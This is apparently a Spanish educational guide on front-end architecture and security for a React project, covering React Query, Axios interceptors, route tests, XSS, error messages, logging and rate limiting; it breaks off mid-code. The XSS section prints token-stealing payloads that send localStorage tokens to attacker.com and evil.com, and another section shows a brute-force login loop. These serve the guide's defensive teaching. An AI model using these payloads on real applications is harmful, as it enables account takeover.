# Guía de Conceptos Fundamentales - FE-EventsR

> Documento educativo con respuestas a preguntas clave sobre la arquitectura del proyecto

---

## Tabla de Contenidos

1. [¿Por qué separamos estado cliente y servidor?](#1-por-qué-separamos-estado-cliente-y-servidor)
2. [¿Qué hacen los interceptores de Axios?](#2-qué-hacen-los-interceptores-de-axios)
3. [¿Por qué testear rutas protegidas?](#3-por-qué-testear-rutas-protegidas)
4. [¿Qué es XSS y cómo prevenirlo?](#4-qué-es-xss-y-cómo-prevenirlo)
5. [¿Por qué usar mensajes de error genéricos?](#5-por-qué-usar-mensajes-de-error-genéricos)
6. [¿Para qué sirve un Logger?](#6-para-qué-sirve-un-logger)
7. [¿Qué es Rate Limiting (useRateLimit)?](#7-qué-es-rate-limiting-useratelimit)

---

## 1. ¿Por qué separamos estado cliente y servidor?

### Respuesta Corta
Porque son **tipos de datos diferentes** con **necesidades diferentes**.

### Respuesta Completa

#### Estado del Servidor (React Query)
Son datos que **no te pertenecen**, vienen de una API externa:
- Lista de eventos
- Perfil de usuario
- Reservaciones
- Comentarios

**Características:**
- Pueden estar **desactualizados** (alguien más los puede cambiar)
- Necesitan **sincronización** constante
- Requieren **caché** para no hacer peticiones repetidas
- Tienen estados de **loading/error** inherentes

**Ejemplo en nuestro código:**
```typescript
// Hook personalizado que usa React Query
const loginMutation = useLogin()

// React Query maneja automáticamente:
loginMutation.isPending   // ¿Está cargando?
loginMutation.isError     // ¿Hubo error?
loginMutation.data        // Los datos de respuesta
```

#### Estado del Cliente (useState/Zustand)
Son datos que **te pertenecen**, viven solo en tu navegador:
- Texto que el usuario está escribiendo
- Modal abierto/cerrado
- Tema oscuro/claro
- Filtros de búsqueda

**Características:**
- Siempre están **actualizados** (solo tú los cambas)
- No necesitan sincronización
- No tienen loading (son instantáneos)

**Ejemplo en nuestro código:**
```typescript
// Estado local del formulario
const [formData, setFormData] = useState({
    email: "",
    password: ""
})
```

### ¿Qué pasa si NO separas?

#### ❌ Problemas sin separación

**Ejemplo malo (todo en useState):**
```typescript
const [events, setEvents] = useState([])
const [loading, setLoading] = useState(false)
const [error, setError] = useState(null)

useEffect(() => {
    setLoading(true)
    fetch('/api/events')
        .then(res => res.json())
        .then(data => setEvents(data))
        .catch(err => setError(err))
        .finally(() => setLoading(false))
}, [])

// Problemas:
// 1. Si dos componentes piden eventos, hace 2 peticiones
// 2. No hay caché, cada vez re-fetch
// 3. Código repetitivo en cada componente
// 4. Difícil manejar revalidación
```

#### ✅ Con separación (React Query)

**Ejemplo bueno:**
```typescript
const { data: events, isLoading, error } = useQuery({
    queryKey: ['events'],
    queryFn: () => fetch('/api/events').then(r => r.json())
})

// Ventajas:
// 1. Múltiples componentes = 1 sola petición
// 2. Caché automático
// 3. Refetch en background
// 4. Sincronización entre componentes
```

### Analogía del Mundo Real

Imagina una **biblioteca**:

**Libros de la biblioteca (Estado del servidor):**
- No son tuyos
- Otros pueden estar leyéndolos
- Necesitas verificar si están disponibles
- Pueden estar desactualizados (nueva edición)

**Tu libreta de notas (Estado del cliente):**
- Es tuya
- Nadie más la modifica
- Siempre actualizada
- Acceso instantáneo

### Ventajas y Desventajas

#### React Query (Estado del Servidor)

**Ventajas:**
- ✅ Caché automático
- ✅ Sincronización entre componentes
- ✅ Estados de loading/error manejados
- ✅ Revalidación en background
- ✅ Retry automático en errores

**Desventajas:**
- ❌ Curva de aprendizaje
- ❌ Complejidad inicial para apps muy pequeñas

#### Zustand/useState (Estado del Cliente)

**Ventajas:**
- ✅ Simple y directo
- ✅ Cambios instantáneos
- ✅ Control total

**Desventajas:**
- ❌ Sin caché
- ❌ Sin sincronización
- ❌ Debes manejar loading/error manualmente

---

## 2. ¿Qué hacen los interceptores de Axios?

### Respuesta Corta
Son "middlewares" que **modifican automáticamente** todas las peticiones HTTP **antes de enviarlas** y todas las respuestas **antes de recibirlas**.

### Respuesta Completa

#### Interceptor de Request (Peticiones)

**Ubicación en nuestro código:**
`/src/lib/axios.interceptors.ts`

```typescript
api.interceptors.request.use(
    (config) => {
        const token = useAuthStore.getState().user?.token
        if (token) {
            config.headers.Authorization = `Bearer ${token}`
        }
        return config
    },
    (error) => Promise.reject(error)
)
```

**¿Qué hace?**
Antes de **cada petición** HTTP:
1. Lee el token del store de Zustand
2. Si existe, lo añade al header `Authorization`
3. Envía la petición modificada

**Analogía:** Es como un asistente que pone tu credencial en cada puerta automáticamente, sin que tengas que acordarte.

#### Sin interceptor (código repetitivo)

```typescript
// En cada servicio tendrías que hacer esto:
const token = localStorage.getItem('token')
axios.get('/api/events', {
    headers: { Authorization: `Bearer ${token}` }
})

axios.post('/api/events', data, {
    headers: { Authorization: `Bearer ${token}` }
})

// 😫 Repetitivo y propenso a errores
```

#### Con interceptor

```typescript
// Simplemente:
axios.get('/api/events')
axios.post('/api/events', data)

// 🎉 El token se añade automáticamente
```

### Interceptor de Response (Respuestas)

**Ubicación en nuestro código:**
`/src/lib/axios.interceptors.ts`

```typescript
api.interceptors.response.use(
    (response) => response, // Si todo bien, retorna normal
    async (error) => {
        const originalRequest = error.config

        // Si error 401 (token expirado) y no hemos reintentado
        if (error.response?.status === 401 && !originalRequest._retry) {
            originalRequest._retry = true // Marca para evitar loop infinito

            const refreshToken = useAuthStore.getState().user?.refreshToken

            if (refreshToken) {
                try {
                    // Llama al endpoint de refresh
                    const loginResponse = await authService.refreshToken(refreshToken)

                    // Actualiza tokens en el store
                    useAuthStore.getState().updateUser({
                        token: loginResponse.token,
                        refreshToken: loginResponse.refreshToken
                    })

                    // Reintenta la petición original con nuevo token
                    return api(originalRequest)

                } catch (refreshError) {
                    // Si refresh falla, cierra sesión
                    useAuthStore.getState().logout()
                    window.location.href = '/login'
                    return Promise.reject(refreshError)
                }
            }
        }

        return Promise.reject(error)
    }
)
```

### Flujo completo de renovación de token

```
1. Usuario hace petición GET /api/profile
   ↓
2. Request interceptor añade token (expirado)
   ↓
3. Servidor responde: 401 Unauthorized
   ↓
4. Response interceptor detecta 401
   ↓
5. Llama a POST /auth/refresh con refreshToken
   ↓
6. Servidor retorna nuevos tokens
   ↓
7. Actualiza tokens en Zustand
   ↓
8. REINTENTA GET /api/profile (con nuevo token)
   ↓
9. Servidor responde: 200 OK + datos del perfil
   ↓
10. Usuario recibe datos (¡ni se enteró del refresh!)
```

### ¿Por qué es brillante?

**Ventajas:**
- ✅ **Experiencia de usuario fluida:** El usuario no ve ningún error
- ✅ **Código DRY:** No repites lógica de refresh en cada componente
- ✅ **Seguridad:** Tokens de corta duración (15 min) son más seguros
- ✅ **Transparente:** Los componentes no saben que pasó

**Desventajas:**
- ❌ **Debugging complejo:** Si algo falla, es difícil rastrear el problema
- ❌ **Race conditions:** Si muchas peticiones fallan al mismo tiempo

**Analogía:** Es como tener un carro con arranque automático. Si la batería está baja, la recarga automáticamente sin que tengas que bajarte.

### Mejora futura (evitar múltiples refresh simultáneos)

```typescript
// Evitar múltiples llamadas a refresh simultáneas
let refreshPromise: Promise<any> | null = null

if (error.response?.status === 401) {
    if (!refreshPromise) {
        refreshPromise = authService.refreshToken(refreshToken)
            .finally(() => { refreshPromise = null })
    }
    const loginResponse = await refreshPromise
    // ...continuar
}
```

---

## 3. ¿Por qué testear rutas protegidas?

### Respuesta Corta
Porque son **críticas para la seguridad**. Un bug aquí puede exponer datos privados a usuarios no autorizados.

### Respuesta Completa

#### ¿Qué hace `ProtectedRoute`?

```typescript
// Simplificado
const ProtectedRoute = ({ children }) => {
    const { isAuthenticated } = useAuthStore()

    if (!isAuthenticated) {
        return <Navigate to="/login" />
    }

    return children
}
```

Parece simple, pero hay **MUCHOS casos extremos** que pueden fallar.

### Casos críticos que debemos testear

#### Caso 1: Usuario no autenticado intenta acceder

**Test:**
```typescript
it('debe redirigir a /login si usuario no está autenticado', () => {
    // ARRANGE: Usuario NO autenticado
    vi.mocked(useAuthStore).mockReturnValue({
        user: null,
        isAuthenticated: false,
        // ...
    })

    // ACT: Intentar acceder a ruta protegida
    render(
        <MemoryRouter initialEntries={['/dashboard']}>
            <Routes>
                <Route
                    path="/dashboard"
                    element={
                        <ProtectedRoute>
                            <div>Dashboard Secreto</div>
                        </ProtectedRoute>
                    }
                />
                <Route path="/login" element={<div>Login Page</div>} />
            </Routes>
        </MemoryRouter>
    )

    // ASSERT: Debe mostrar login, NO dashboard
    expect(screen.getByText('Login Page')).toBeInTheDocument()
    expect(screen.queryByText('Dashboard Secreto')).not.toBeInTheDocument()
})
```

**¿Por qué es importante?**

❌ **Sin este test:** Podrías hacer un cambio que rompa la lógica:
```typescript
// Alguien hace este cambio por error:
if (isAuthenticated) {  // ❌ Invertido!
    return <Navigate to="/login" />
}
```

✅ **Con el test:** El test falla inmediatamente, detectas el bug.

#### Caso 2: Usuario autenticado puede acceder

**Test:**
```typescript
it('debe mostrar children si usuario está autenticado', () => {
    // ARRANGE: Usuario autenticado
    vi.mocked(useAuthStore).mockReturnValue({
        user: {
            id: '1',
            email: 'test@example.com',
            token: 'valid-token'
        },
        isAuthenticated: true,
        // ...
    })

    // ACT
    render(
        <MemoryRouter initialEntries={['/dashboard']}>
            <Routes>
                <Route
                    path="/dashboard"
                    element={
                        <ProtectedRoute>
                            <div>Dashboard Content</div>
                        </ProtectedRoute>
                    }
                />
            </Routes>
        </MemoryRouter>
    )

    // ASSERT
    expect(screen.getByText('Dashboard Content')).toBeInTheDocument()
})
```

#### Caso 3: Guardar ruta de origen para volver después del login

**Funcionalidad:**
```typescript
// Usuario intenta ir a /dashboard sin autenticarse
// Después de login, debe volver a /dashboard automáticamente

const ProtectedRoute = ({ children }) => {
    const { isAuthenticated } = useAuthStore()
    const location = useLocation()

    if (!isAuthenticated) {
        // Guarda la ruta original en state
        return <Navigate to="/login" state={{ from: location }} />
    }

    return children
}
```

**Test:**
```typescript
it('debe guardar la ruta de origen en location.state', () => {
    // ... test que verifica que state.from = '/dashboard'
})
```

**¿Por qué importante?**

Flujo de usuario:
1. Usuario recibe email: "Tienes un nuevo comentario en /events/123"
2. Click en link → No autenticado → Redirige a login
3. Usuario se loguea → **Debe volver a /events/123** (no a home)

Sin este test, podrías romper esta funcionalidad y no darte cuenta.

#### Caso 4: Rutas con roles específicos

**Funcionalidad avanzada:**
```typescript
<ProtectedRoute requiredRoles={['ADMIN']}>
    <AdminPanel />
</ProtectedRoute>
```

**Test:**
```typescript
it('debe redirigir si usuario no tiene el rol requerido', () => {
    vi.mocked(useAuthStore).mockReturnValue({
        user: { role: 'USER' }, // No es ADMIN
        isAuthenticated: true,
    })

    render(
        <ProtectedRoute requiredRoles={['ADMIN']}>
            <AdminPanel />
        </ProtectedRoute>
    )

    // Debe redirigir a /unauthorized o /home
    expect(screen.queryByText('Admin Panel')).not.toBeInTheDocument()
})
```

**Riesgo sin test:**
Un bug aquí puede dar acceso de administrador a usuarios normales = **DESASTRE DE SEGURIDAD**

### Escenario real sin tests

```typescript
// Desarrollador A: implementa ProtectedRoute correctamente
const ProtectedRoute = ({ children }) => {
    const { isAuthenticated } = useAuthStore()
    if (!isAuthenticated) return <Navigate to="/login" />
    return children
}

// ✅ Todo funciona

// 2 meses después...
// Desarrollador B: "optimiza" el código
const ProtectedRoute = ({ children }) => {
    const { user } = useAuthStore()
    if (user) return children  // ❌ BUG: user puede existir pero sin token válido
    return <Navigate to="/login" />
}

// ❌ Sin tests: Bug pasa a producción
// ❌ Usuarios con tokens expirados acceden a rutas protegidas
// ❌ Datos sensibles expuestos
```

**Con tests:**
```bash
❌ FAIL: debe redirigir a /login si usuario no está autenticado
Expected: "Login Page"
Received: "Dashboard Secreto"
```

### Patrón AAA en tests

**Arrange, Act, Assert:**

1. **Arrange** (Preparar): Configura datos de prueba, mocks
2. **Act** (Actuar): Ejecuta la función que estás testeando
3. **Assert** (Afirmar): Verifica que el resultado es el esperado

---

## 4. ¿Qué es XSS y cómo prevenirlo?

### Respuesta Corta
**XSS (Cross-Site Scripting)** es cuando un atacante inyecta código JavaScript malicioso en tu aplicación para robar datos o hacer acciones no autorizadas.

### Respuesta Completa

#### ¿Cómo funciona un ataque XSS?

**Escenario de ataque:**

Tu app tiene un campo de comentarios:
```tsx
// ❌ CÓDIGO VULNERABLE
const Comment = ({ text }) => {
    return <div dangerouslySetInnerHTML={{ __html: text }} />
}
```

Atacante escribe este "comentario":
```html
<script>
    // Roba el token del localStorage
    const token = localStorage.getItem('auth-storage')

    // Lo envía a su servidor
    fetch('https://attacker.com/steal?token=' + token)
</script>
```

**Lo que pasa:**
1. ✅ Atacante publica el comentario
2. ✅ Víctima abre la página
3. ✅ El script malicioso se ejecuta en el navegador de la víctima
4. ✅ El token se envía al servidor del atacante
5. ❌ **Atacante ahora tiene acceso a la cuenta de la víctima**

### Tipos de XSS

#### 1. XSS Reflejado (Reflected XSS)

```
URL maliciosa:
https://tu-app.com/search?q=<script>alert('XSS')</script>

Si tu código hace:
<h1>Resultados para: {query}</h1>

El script se ejecuta.
```

#### 2. XSS Almacenado (Stored XSS)

```
Atacante guarda script en base de datos (ej: comentario)
Cada víctima que ve el comentario ejecuta el script
```

#### 3. XSS Basado en DOM

```javascript
// JavaScript vulnerable
const hash = window.location.hash
document.getElementById('content').innerHTML = hash

// URL maliciosa:
https://app.com#<img src=x onerror="alert('XSS')">
```

### ¿Cómo prevenir XSS en React?

#### ✅ BUENA NOTICIA: React previene XSS automáticamente

**React escapa contenido por defecto:**
```tsx
// ✅ SEGURO: React escapa automáticamente
const Comment = ({ text }) => {
    return <div>{text}</div>
}

// Si text = "<script>alert('XSS')</script>"
// React renderiza literalmente el texto, NO ejecuta el script:
// <div>&lt;script&gt;alert('XSS')&lt;/script&gt;</div>
```

#### ❌ Única forma de romper la protección

```tsx
// ❌ PELIGROSO: Desactiva la protección de React
<div dangerouslySetInnerHTML={{ __html: userInput }} />

// El nombre "dangerouslySetInnerHTML" es intencional
// React te avisa: "Esto es peligroso"
```

### Prevenciones en nuestro proyecto

#### 1. NUNCA uses `dangerouslySetInnerHTML` con input de usuario

```tsx
// ❌ PELIGROSO
<div dangerouslySetInnerHTML={{ __html: comment.text }} />

// ✅ SEGURO
<div>{comment.text}</div>

// ✅ Si necesitas HTML sanitizado:
import DOMPurify from 'dompurify'
const cleanHTML = DOMPurify.sanitize(comment.text)
<div dangerouslySetInnerHTML={{ __html: cleanHTML }} />
```

#### 2. Validar inputs con Zod

Nuestro código ya hace esto:
```typescript
// auth.schema.ts
export const loginSchema = z.object({
    email: z.string().email(),
    password: z.string().min(8)
})
```

Esto previene que se envíen scripts en lugar de emails.

#### 3. Content Security Policy (CSP)

Añade a `index.html`:
```html
<meta
    http-equiv="Content-Security-Policy"
    content="default-src 'self'; script-src 'self'; object-src 'none';"
>
```

Esto le dice al navegador:
- Solo ejecutar scripts de tu dominio
- Bloquear scripts inline
- Bloquear scripts de terceros

#### 4. HTTP-Only Cookies para tokens

```typescript
// ❌ VULNERABLE a XSS
localStorage.setItem('token', token) // JavaScript puede leerlo

// ✅ MÁS SEGURO
// Backend envía token en cookie con httpOnly:
Set-Cookie: token=xyz; HttpOnly; Secure; SameSite=Strict

// JavaScript NO puede acceder a esta cookie
console.log(document.cookie) // No incluye tokens httpOnly
```

### Ejemplo práctico en nuestra app

**Escenario:** Campo de nombre de usuario

```tsx
// ❌ VULNERABLE (si usáramos esto)
const UserProfile = () => {
    const user = useAuthStore(state => state.user)

    return (
        <div dangerouslySetInnerHTML={{ __html: user.name }} />
    )
}

// Atacante podría registrarse con nombre:
// <img src=x onerror="fetch('https://evil.com?token=' + localStorage.getItem('auth-storage'))">
```

```tsx
// ✅ SEGURO (nuestro código actual)
const UserProfile = () => {
    const user = useAuthStore(state => state.user)

    return <div>{user.name}</div> // React escapa automáticamente
}
```

### Lista de verificación de seguridad XSS

- [ ] ✅ Nunca usar `dangerouslySetInnerHTML` con input de usuario
- [ ] ✅ Validar todos los inputs con Zod
- [ ] ✅ Implementar Content Security Policy
- [ ] ✅ Considerar httpOnly cookies para tokens
- [ ] ✅ Sanitizar HTML si es absolutamente necesario (DOMPurify)
- [ ] ✅ No construir HTML con concatenación de strings
- [ ] ✅ Revisar dependencias con `npm audit`

---

## 5. ¿Por qué usar mensajes de error genéricos?

### Respuesta Corta
Para **no revelar información** que ayude a un atacante a hackear cuentas.

### Respuesta Completa

#### El Problema: Enumeración de Usuarios

**Escenario con mensajes específicos:**

```typescript
// ❌ PELIGROSO: Mensajes diferentes según el error
if (email no existe) {
    return "Este email no está registrado"
}
if (password incorrecta) {
    return "Contraseña incorrecta"
}
```

**Ataque posible:**

```
Atacante prueba: hacker@test.com
Respuesta: "Este email no está registrado"

Atacante prueba: admin@tu-empresa.com
Respuesta: "Contraseña incorrecta"

🚨 Ahora el atacante SABE que admin@tu-empresa.com existe
```

**Con esa información, el atacante puede:**
1. ✅ Confirmar emails de empleados
2. ✅ Hacer ataque de fuerza bruta solo en emails válidos
3. ✅ Enviar phishing dirigido
4. ✅ Intentar ataques de ingeniería social

#### La Solución: Mensaje Genérico

```typescript
// ✅ SEGURO: Mismo mensaje siempre
if (error de login) {
    return "Email o contraseña incorrectos"
}
```

**Ahora el atacante no puede distinguir:**
```
Prueba: hacker@test.com
Respuesta: "Email o contraseña incorrectos"

Prueba: admin@tu-empresa.com
Respuesta: "Email o contraseña incorrectos"

🤷 ¿Cuál existe? No se sabe
```

### Otros casos donde se aplica esto

#### 1. Endpoint de "Olvidé mi contraseña"

```typescript
// ❌ REVELA INFORMACIÓN
if (email no existe) {
    return "Este email no está registrado"
} else {
    return "Email de recuperación enviado"
}

// ✅ NO REVELA NADA
// Siempre retorna:
return "Si el email existe, recibirás instrucciones de recuperación"
```

#### 2. Registro de usuarios

```typescript
// ❌ REVELA INFORMACIÓN
if (email ya existe) {
    return "Este email ya está registrado"
}

// ✅ MEJOR (pero no siempre factible)
return "Email ya registrado o inválido"

// O enviar email al dueño:
"Si este email te pertenece, alguien intentó registrarse. Ignora este mensaje."
```

### Implementación en nuestro código

**LoginForm.tsx actual (probablemente):**
```tsx
// ❌ Muestra mensaje exacto del servidor
{loginMutation.isError && (
    <div className="text-red-600">
        {loginMutation.error.response?.data?.message}
    </div>
)}

// Si backend retorna:
// { message: "Usuario no encontrado" } → Se muestra al usuario
```

**Cambio recomendado:**
```tsx
// ✅ Mensaje genérico
{loginMutation.isError && (
    <div className="text-red-600">
        Email o contraseña incorrectos
    </div>
)}

// O si necesitas diferentes mensajes para otros errores:
{loginMutation.isError && (
    <div className="text-red-600">
        {loginMutation.error.response?.status === 401
            ? "Email o contraseña incorrectos"
            : "Error al iniciar sesión. Intenta de nuevo."}
    </div>
)}
```

### Balance: UX vs Seguridad

**Algunos desarrolladores argumentan:**
> "Pero si le digo al usuario que el email no existe, puede corregirlo más rápido"

**Contraargumento:**
- **Seguridad > Comodidad:** Es más importante proteger a tus usuarios
- **UX alternativa:** En lugar de revelar info, ofrece:
  - Link de registro si olvidó que no tiene cuenta
  - Sugerencias de emails similares (autocomplete)
  - Opción de "Olvidé mi email"

### Casos donde SÍ puedes ser específico

**Validaciones de formato (antes de enviar al servidor):**
```tsx
// ✅ SEGURO: Validación en frontend antes de submit
if (!emailSchema.safeParse(email).success) {
    return "Email inválido (debe tener formato email@ejemplo.com)"
}

// No revela si el email existe, solo si el formato es válido
```

### Lista de verificación de mensajes de error

- [ ] ✅ Login: "Email o contraseña incorrectos" (nunca específico)
- [ ] ✅ Registro: "Error al registrar" (no revelar si email existe)
- [ ] ✅ Recuperación: "Si el email existe, recibirás instrucciones"
- [ ] ✅ Validaciones de formato: Pueden ser específicas (están en frontend)
- [ ] ✅ Errores de servidor (500): "Error del servidor, intenta más tarde"
- [ ] ✅ Errores de red: "Sin conexión a internet"

---

## Resumen Ejecutivo

| Concepto | Pregunta Clave | Respuesta Corta |
|----------|----------------|-----------------|
| **Estado** | ¿Por qué separar cliente y servidor? | Porque datos del servidor (pueden cambiar) necesitan caché/sincronización; datos del cliente (solo tú los cambias) no. |
| **Interceptores** | ¿Qué hacen los interceptores de Axios? | Modifican automáticamente todas las peticiones (añaden token) y respuestas (renuevan token expirado). |
| **Tests** | ¿Por qué testear rutas protegidas? | Son críticas para seguridad. Un bug puede exponer datos privados. |
| **XSS** | ¿Qué es XSS y cómo prevenirlo? | Inyección de código malicioso. Se previene: nunca usar `dangerouslySetInnerHTML` con input de usuario, validar con Zod, usar CSP. |
| **Errores** | ¿Por qué mensajes genéricos? | Para no revelar si un email existe, previene enumeración de usuarios y ataques dirigidos. |

---

## Referencias y Recursos

### Documentación Oficial
- [React Query (TanStack Query)](https://tanstack.com/query/latest/docs/react/overview)
- [Zustand](https://docs.pmnd.rs/zustand/getting-started/introduction)
- [Axios](https://axios-http.com/docs/intro)
- [Zod](https://zod.dev/)

### Seguridad Web
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [JWT Best Practices](https://tools.ietf.org/html/rfc8725)
- [Content Security Policy (CSP)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)

### Testing
- [Vitest](https://vitest.dev/)
- [React Testing Library](https://testing-library.com/react)

---

## 6. ¿Para qué sirve un Logger?

### Respuesta Corta
Un **logger** es una herramienta para registrar eventos, errores y mensajes de manera **controlada y segura**, evitando exponer información sensible en producción.

### Respuesta Completa

#### El Problema con `console.log` directo

**Sin logger (código vulnerable):**
```typescript
// ❌ Problema de seguridad
console.error('Login failed:', error)

// En producción expone:
// - Stack traces completos
// - Rutas de archivos internos
// - Tokens/credenciales en objetos
// - Estructura de la base de datos
```

**Escenario real:**
```typescript
// useLogin.ts
onError: (error: AxiosError) => {
    console.error('Login Failed:', error)
}

// Usuario abre DevTools en producción y ve:
{
  response: {
    data: {
      error: "Usuario no encontrado en tabla users.auth_users",
      stack: "Error at /var/www/api/auth/login.js:42"
    }
  }
}
// ☠️ Expuso: nombre de tabla, estructura de BD, ruta de archivos
```

#### La Solución: Logger con Control de Ambiente

**Implementación en nuestro proyecto:**
```typescript
// src/lib/logger.ts
export const logger = {
    error: (message: string, error?: unknown) => {
        if (import.meta.env.DEV) {
            // Desarrollo: muestra TODO
            console.error(`[ERROR] ${message}`, error)
        } else {
            // Producción: solo mensaje genérico
            console.error(`[ERROR] ${message}`)
            // Opcional: enviar a Sentry/LogRocket
        }
    },

    warn: (message: string, data?: unknown) => {
        if (import.meta.env.DEV) {
            console.warn(`[WARN] ${message}`, data)
        }
    },

    info: (message: string) => {
        if (import.meta.env.DEV) {
            console.info(`[INFO] ${message}`)
        }
    },

    debug: (message: string, data?: unknown) => {
        // Solo en desarrollo
        if (import.meta.env.DEV) {
            console.debug(`[DEBUG] ${message}`, data)
        }
    }
}
```

**Uso correcto:**
```typescript
// useLogin.ts
import { logger } from '@/lib/logger'

onError: (error: AxiosError) => {
    logger.error('Login Failed', error)  // Seguro en producción
    options?.onError?.(error)
}

// Desarrollo (localhost):
// Console: [ERROR] Login Failed {response: {...}, stack: "..."}

// Producción:
// Console: [ERROR] Login Failed
```

### Ventajas del Logger

#### 1. Seguridad - Previene Información Sensible
```typescript
logger.error('API failed', error)

// Desarrollo: Muestra error completo para debugging
// Producción: Solo mensaje genérico
```

#### 2. Control por Ambiente
```typescript
logger.debug('User clicked button', {userId: 123})
// ✅ Se muestra en desarrollo
// ❌ No se muestra en producción (evita ruido)

logger.error('Payment failed', error)
// ✅ Se muestra en ambos ambientes
```

#### 3. Integración con Servicios de Monitoreo
```typescript
const logger = new Logger({
    sendToService: (level, message, data) => {
        // Enviar a Sentry, LogRocket, Datadog, etc.
        if (level === 'error') {
            Sentry.captureException(data)
        }
    }
})

logger.error('Checkout failed', error)
// → Se envía automáticamente a Sentry
// → Recibes notificación por email/Slack
// → Puedes ver stack trace completo en dashboard privado
```

#### 4. Categorización y Búsqueda
```typescript
logger.error('Payment failed')    // [ERROR] Payment failed
logger.warn('Slow API response')  // [WARN] Slow API response
logger.info('User logged in')     // [INFO] User logged in
logger.debug('State updated')     // [DEBUG] State updated

// Fácil de filtrar en consola del navegador
// Fácil de buscar en servicios de monitoreo
```

### Comparación: console.log vs Logger

| Aspecto | `console.log` | Logger |
|---------|---------------|--------|
| **Seguridad** | ❌ Expone todo | ✅ Sanitiza en producción |
| **Control** | ❌ Siempre activo | ✅ Configurable por ambiente |
| **Monitoreo** | ❌ Solo en consola local | ✅ Envía a servicios externos |
| **Categorización** | ❌ Todo mezclado | ✅ Por nivel (error/warn/info) |
| **Producción** | ❌ Ruido y riesgo | ✅ Solo lo necesario |
| **Debugging** | ✅ Simple | ⚠️ Requiere configuración |

### Niveles de Log y Cuándo Usarlos

```typescript
// ERROR - Algo se rompió, requiere atención inmediata
logger.error('Failed to save user data', error)
logger.error('Database connection lost', dbError)

// WARN - Algo extraño pero no crítico
logger.warn('API response took 5 seconds')
logger.warn('Deprecated function used: getUserOld()')

// INFO - Eventos importantes pero normales
logger.info('User logged in successfully')
logger.info('Payment processed')

// DEBUG - Información detallada para debugging
logger.debug('State updated', { oldState, newState })
logger.debug('API request sent', { url, params })
```

### Ejemplo Práctico: Antes y Después

**❌ Código vulnerable (antes):**
```typescript
// src/features/auth/hooks/useLogin.ts
onError: (error: AxiosError) => {
    console.error('Login Failed:', error)  // Expone todo
}

// Producción - Usuario abre DevTools:
// AxiosError: Request failed with status code 401
//   at createError (axios.js:123)
//   response: {
//     data: { message: "Invalid password for user@email.com" }
//   }
// ☠️ Expone: email del usuario, tipo de error específico
```

**✅ Código seguro (después):**
```typescript
// src/features/auth/hooks/useLogin.ts
import { logger } from '@/lib/logger'

onError: (error: AxiosError) => {
    logger.error('Login Failed', error)  // Seguro
}

// Producción - Usuario abre DevTools:
// [ERROR] Login Failed
// ✅ Solo mensaje genérico, sin detalles sensibles

// Desarrollo - Consola local:
// [ERROR] Login Failed AxiosError: { ... stack trace completo ... }
// ✅ Toda la información para debugging
```

### Integración con Servicios Externos

#### Sentry (Monitoreo de Errores)
```typescript
import * as Sentry from '@sentry/react'

export const logger = {
    error: (message: string, error?: unknown) => {
        if (import.meta.env.DEV) {
            console.error(`[ERROR] ${message}`, error)
        } else {
            console.error(`[ERROR] ${message}`)

            // Enviar a Sentry en producción
            if (error instanceof Error) {
                Sentry.captureException(error, {
                    tags: { context: message }
                })
            }
        }
    }
}

// Beneficios:
// - Recibes notificaciones cuando hay errores
// - Stack traces completos en dashboard privado
// - Agrupación automática de errores similares
// - Información del navegador/OS del usuario
```

### Mejores Prácticas

#### ✅ DO (Hacer)
```typescript
// Usar logger en lugar de console
logger.error('Failed to fetch user', error)

// Incluir contexto útil
logger.error('API call failed', { endpoint: '/users', status: 500 })

// Usar nivel apropiado
logger.debug('Rendering component', { props })  // Solo en dev
logger.error('Critical failure', error)         // En producción también
```

#### ❌ DON'T (No hacer)
```typescript
// No usar console directamente
console.error('Error:', error)  // ❌

// No loguear información sensible
logger.info('User logged in', { password: '123' })  // ❌

// No usar error para todo
logger.error('Button clicked')  // ❌ Usar debug o info
```

### Configuración Avanzada

```typescript
// src/lib/logger.ts
interface LoggerConfig {
    enableInProduction: boolean
    sendToService?: (level: string, message: string, data?: unknown) => void
}

class Logger {
    constructor(private config: LoggerConfig) {}

    error(message: string, error?: unknown) {
        const shouldLog = import.meta.env.DEV || this.config.enableInProduction

        if (shouldLog) {
            console.error(`[ERROR] ${message}`, error)
        }

        // Siempre enviar a servicio externo
        this.config.sendToService?.('error', message, error)
    }
}

// Uso
export const logger = new Logger({
    enableInProduction: false,
    sendToService: (level, message, data) => {
        // Enviar a Sentry, LogRocket, etc.
        if (import.meta.env.PROD) {
            Sentry.captureMessage(message, { level, extra: { data } })
        }
    }
})
```

---

## 7. ¿Qué es Rate Limiting (useRateLimit)?

### Respuesta Corta
**Rate limiting** es limitar el número de intentos que un usuario puede hacer en un período de tiempo para **prevenir ataques de fuerza bruta**.

### Respuesta Completa

#### El Problema: Ataques de Fuerza Bruta

**Sin rate limiting:**
```typescript
// Usuario/atacante puede intentar login infinitas veces
handleSubmit() {
    login(email, password)  // ❌ Sin límite
}
```

**Ataque automatizado:**
```javascript
// Script del atacante
const passwords = loadPasswordList()  // 10 millones de contraseñas

for (let i = 0; i < passwords.length; i++) {
    await login('victim@email.com', passwords[i])
}
// Puede probar millones de contraseñas en horas
```

#### La Solución: useRateLimit Hook

**Implementación en nuestro proyecto:**
```typescript
// src/global/hooks/useRateLimit.ts
const rateLimit = useRateLimit('login', {
    maxAttempts: 5,           // Máximo 5 intentos fallidos
    windowMs: 60000,          // En ventana de 1 minuto (60,000ms)
    blockDurationMs: 300000   // Bloquear por 5 minutos (300,000ms)
})

// Uso en LoginForm
if (rateLimit.isBlocked) {
    return `Bloqueado por ${rateLimit.remainingTime} segundos`
}

try {
    await login(email, password)
    rateLimit.reset()  // ✅ Login exitoso
} catch {
    rateLimit.recordAttempt()  // ❌ Login fallido
}
```

### Funcionamiento Paso a Paso

```
Intento 1 (fallido):
  attempts: 1/5 ✅ Permitido

Intento 2 (fallido):
  attempts: 2/5 ✅ Permitido

Intento 3 (fallido):
  attempts: 3/5 ✅ Permitido

Intento 4 (fallido):
  attempts: 4/5 ✅ Permitido

Intento 5 (fallido):
  attempts: 5/5 ⚠️ Límite alcanzado
  → BLOQUEADO por 5 minutos
  → Estado guardado en localStorage

Intento 6:
  isBlocked: true ❌
  remainingTime: 289 segundos
  → Formulario deshabilitado
  → Mensaje: "Espera 289 segundos"

Después de 5 minutos:
  isBlocked: false ✅
  attempts: 0
  → Usuario puede intentar nuevamente
```

### Implementación del Hook

```typescript
// src/global/hooks/useRateLimit.ts
export function useRateLimit(key: string, config: RateLimitConfig) {
    const [state, setState] = useState<RateLimitState>({
        attempts: 0,
        blockedUntil: null
    })

    // Cargar estado persistido al montar
    useEffect(() => {
